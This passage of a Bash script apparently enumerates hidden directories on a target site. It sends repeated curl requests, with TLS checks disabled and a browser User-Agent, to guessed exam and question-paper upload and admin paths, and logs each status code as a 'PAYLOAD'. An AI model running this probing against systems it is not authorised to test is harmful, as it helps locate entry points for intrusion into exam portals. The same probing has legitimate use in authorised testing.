         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPBData/"]: "
